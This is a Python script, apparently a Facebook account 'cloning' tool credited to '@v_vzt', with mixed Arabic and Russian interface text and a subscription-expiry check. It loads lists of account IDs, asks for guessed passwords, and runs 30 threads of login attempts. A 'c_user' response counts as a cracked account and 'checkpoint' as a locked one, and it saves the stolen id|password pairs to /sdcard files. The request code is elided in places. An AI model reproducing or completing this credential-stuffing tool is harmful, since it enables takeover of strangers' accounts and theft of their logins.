...
an2 = datetime.datetime(2090, 4, 7, 5, 18, 55)#تحكم بالوقت
if an > an2 or an == an2:
        exit("انتهئ وقت الاشتراك في الاداه راسل المطور اداه لتشغيلها  :@v_vzt")
else:
        pass
import os
def ar():
...
\033[1;31m @v_vzt Разработчик Элафио
🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦
🟦⬜⬜⬜⬜⬜⬜⬜⬜⬜🟦
🟦⬜🟦🟦🟦⬜🟦🟦🟦⬜🟦
🟦⬜🟦⬜⬜⬜⬜⬜🟦⬜🟦
...
🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦
\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;34m
 Инструмент разработчика  : \033[1;36mЭлафио\033[1;37m
 Разработчик  : \033[1;31m@v_vzt\033[1;37m
 Выпускать     : \033[1;36m1.5\033[1;37m
\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;32m
""")
def linex():
...
def Fof():
	clear()
	print(f" [\033[1;32m1\033[1;37m] From file ")
	print(f" [\033[1;32m2\033[1;37m] Random ")
	#print(f" [3] Gmail Cloning")
	print(f" [\033[1;31m0\033[1;37m] Выход ")
	me=input(f' [\033[1;32m✓\033[1;37m] Ваш выбор  : ')
	if me in ["2", "02"]:
	...
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f' [\033[1;32m✓\033[1;37m] Put file [\033[1;32m❯\033[1;37m] ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' [\033[1;32mX\033[1;37m] File غير موجود ')
			exit()
		print(f' [\033[1;31m1\033[1;37m] дорога \033[1;32m1\033[1;37m [\033[1;32mMix Ids\033[1;37m] \n [\033[1;31m2\033[1;37m] дорога \033[1;32m2\033[1;37m [\033[1;32m Mexico Ids\033[1;37m] \n [\033[1;31m3\033[1;37m] дорога \033[1;32m3\033[1;37m [\033[1;32mIndia Ids\033[1;37m] \n [\033[1;31m4\033[1;37m] дорога \033[1;32m4\033[1;37m [\033[1;32mBd Ids\033[1;37m]  ')
		mthd=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
		plist=[]
		try:
			ps_limit = int(input(f' [\033[1;32m?\033[1;37m] How many Password [\033[1;32m⟩\033[1;37m] '))
		except:
			ps_limit =1
		print(f' [\033[1;32m•\033[1;37m] Example: \033[1;36mfirst last,firtslast,first123 \033[1;37m')
		for i in range(ps_limit):
			plist.append(input(f' [\033[1;32m✓\033[1;37m] password {i+1}[\033[1;32m❯\033[1;37m] '))
		print(f' [\033[1;32m?\033[1;37m] Do You show CP (y/n): ')
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f' Total Accounts : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;32mM{mthd}\033[1;37m')
...
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [@v_vzt] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m Ok \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                print(f'\r\r\033[1;32m [@v_vzt\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/@v_vzt•Ok•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [@v_vzt•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/@v_vzt•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/@v_vzt•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/@v_vzt•Ok•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/@v_vzt• Ok •M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [@v_vzt• سكيور ] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/@v_vzt• CP .txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
